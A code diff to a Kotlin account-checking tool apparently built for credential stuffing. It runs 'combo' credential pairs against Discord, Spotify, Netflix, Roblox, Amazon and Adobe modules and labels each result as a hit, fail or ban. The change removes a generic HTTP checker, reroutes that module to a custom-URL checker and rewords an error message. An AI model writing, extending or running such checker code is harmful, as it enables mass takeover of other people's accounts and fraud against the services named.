@@ -140,7 +140,7 @@ stats.cpm = stats.computeCpm()
                     CheckModule.DISCORD -> checkDiscord(combo)
                     CheckModule.SPOTIFY -> checkSpotify(combo)
                     CheckModule.NETFLIX -> checkNetflix(combo)
-                    CheckModule.GENERIC -> checkGeneric(combo)
+                    CheckModule.GENERIC -> checkCustom(combo)
                     CheckModule.ROBLOX -> checkRoblox(combo)
                     CheckModule.AMAZON -> checkAmazon(combo)
                     CheckModule.ADOBE -> checkAdobe(combo)
@@ -260,31 +260,6 @@ stats.cpm = stats.computeCpm()
                     else -> AccountStatus.ERROR
                 }
 
-                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
-            }
-        })
-    }
-
-    private suspend fun checkGeneric(combo: Combo): Account = suspendCoroutine { cont ->
-        val request = Request.Builder()
-            .url(config.module.endpoint)
-            .get()
-            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-            .build()
-
-        getOkHttpClient().newCall(request).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: IOException) {
-                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
-            }
-
-            override fun onResponse(call: Call, response: Response) {
-                response.close()
-                val status = when (response.code) {
-                    200 -> AccountStatus.HIT
-                    401, 403 -> AccountStatus.FAIL
-                    429 -> AccountStatus.BAN
-                    else -> AccountStatus.ERROR
-                }
                 cont.resume(createResult(combo, status, "HTTP ${response.code}"))
             }
         })
@@ -908,7 +883,7 @@ setTimeout(function(){if(!started){window.__silverbullet='no_fields';}},15000);
     private suspend fun checkCustom(combo: Combo): Account = suspendCoroutine { cont ->
         val url = config.customUrl.ifBlank { CheckModule.CUSTOM.endpoint }
         if (url.isEmpty()) {
-            cont.resume(createResult(combo, AccountStatus.ERROR, "Custom module needs a URL"))
+            cont.resume(createResult(combo, AccountStatus.ERROR, "This module needs a URL (fill Request URL above)"))
             return@suspendCoroutine
         }
         try {
